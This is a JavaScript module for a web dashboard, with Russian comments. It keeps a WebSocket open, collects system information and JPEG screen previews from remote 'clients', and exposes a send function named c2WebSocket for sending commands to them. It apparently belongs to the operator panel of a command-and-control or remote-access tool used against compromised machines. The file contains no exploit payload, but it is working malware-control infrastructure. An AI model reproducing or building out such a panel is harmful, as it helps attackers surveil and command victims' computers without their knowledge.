// frontend/dashboard/js/modules/websocket/connection.js
import { updateClient, updateClients, setClientPreview } from '../data/clients.js';
import { decodePacket, encodePacket } from './protocol.js';

let ws;
const dec = new TextDecoder();

// Установка WebSocket соединения с обработкой входящих данных и автореконнектом
export const connectWebSocket = () => {
    const t = localStorage.getItem('auth_token'), l = localStorage.getItem('user_login');
    if (!t || !l) return;

    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${proto}//${location.host}/ws?login=${encodeURIComponent(l)}&token=${t}`);
    ws.binaryType = 'arraybuffer';

    ws.onmessage = ({ data }) => {
        const pkg = decodePacket(data);
        if (!pkg) return;

        const { id, module, payload } = pkg;

        // РАЗРЕШАЕМ ОБА МОДУЛЯ: старый DataScribe и новый SystemInfo
        if (module === 'DataScribe' || module === 'SystemInfo') {
            try {
                const decoded = dec.decode(payload);
                const raw = JSON.parse(decoded);
                // Если пришел массив (весь список) — обновляем всех, если объект — одного
                Array.isArray(raw) ? updateClients(raw) : updateClient({ ...raw, id });
            } catch (e) { 
                console.error("[WS] Data Parse Error", e, "Module:", module); 
            }
        } 
        
        if (module === 'Preview') {
            const url = URL.createObjectURL(new Blob([payload], { type: 'image/jpeg' }));
            const img = document.getElementById(`prev-${id}`);
            setClientPreview(id, url);
            if (img) {
                img.src = url;
                img.style.opacity = "1";
            }
        }
    };

    const reconnect = () => {
        if (ws) ws.onclose = ws.onerror = null;
        setTimeout(connectWebSocket, 5000);
    };

    ws.onclose = ws.onerror = reconnect;
    ws.onopen = () => console.log("🚀 WS Connected");

    window.c2WebSocket = { 
        send: (id, mod, pay) => ws?.readyState === 1 && ws.send(encodePacket(id, mod, pay)) 
    };
};